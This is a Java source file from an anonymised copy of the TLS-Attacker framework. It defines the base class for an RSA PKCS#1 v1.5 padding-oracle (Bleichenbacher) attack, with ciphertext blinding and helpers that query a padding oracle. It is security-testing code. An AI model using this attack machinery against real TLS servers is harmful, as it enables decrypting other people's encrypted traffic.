/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.pkcs1;

import anonymous.tlsattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import anonymous.tlsattacker.util.ArrayConverter;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 
 * @author anonymous anonymous <anonymous.anonymous@anonymous>
 */
public class Pkcs1Attack {

    /**
     * Initialize the log4j LOGGER.
     */
    static Logger LOGGER = LogManager.getLogger(Pkcs1Attack.class);

    protected final Pkcs1Oracle oracle;
    protected final byte[] encryptedMsg;
    protected final RSAPublicKey publicKey;
    protected BigInteger c0;
    protected final int blockSize;
    protected BigInteger solution;
    protected BigInteger bigB;

    public Pkcs1Attack(byte[] msg, Pkcs1Oracle pkcsOracle) {
	this.encryptedMsg = msg.clone();
	this.publicKey = (RSAPublicKey) pkcsOracle.getPublicKey();
	this.oracle = pkcsOracle;
	c0 = BigInteger.ZERO;
	this.blockSize = oracle.getBlockSize();
    }

    /**
     * 
     * @param m
     *            original message to be changed
     * @param si
     *            factor
     * @return (m*si) mod N, or (m*si^e) mod N, depending on the oracle type, in
     *         a byte array
     */
    protected byte[] prepareMsg(BigInteger m, BigInteger si) {
	byte[] msg;
	BigInteger tmp = multiply(m, si);
	msg = ArrayConverter.bigIntegerToByteArray(tmp, blockSize, true);
	return msg;
    }

    /**
     * 
     * @param m
     *            original message to be changed
     * @param si
     *            factor
     * @return (m*si) mod N, or (m*si^e) mod N, depending on the oracle type
     */
    protected BigInteger multiply(BigInteger m, BigInteger si) {
	BigInteger tmp;
	// if we use a real oracle (not a plaintext oracle), the si value has
	// to be encrypted first.
	if (!oracle.isPlaintextOracle()) {
	    // encrypt: si^e mod n
	    tmp = si.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
	} else {
	    tmp = si;
	}
	// blind: c0*(si^e) mod n
	// or: m*si mod n (in case of plaintext oracle)
	tmp = m.multiply(tmp);
	return tmp.mod(publicKey.getModulus());
    }

    protected boolean queryOracle(BigInteger message, BigInteger si) {
	byte[] msg = prepareMsg(message, si);
	System.out.println(ArrayConverter.bytesToHexString(msg));
	return oracle.checkPKCSConformity(msg);
    }

    protected boolean queryOracle(BigInteger message) {
	byte[] msg = ArrayConverter.bigIntegerToByteArray(message, blockSize, true);
	return oracle.checkPKCSConformity(msg);
    }

    public BigInteger getSolution() {
	return solution;
    }

}
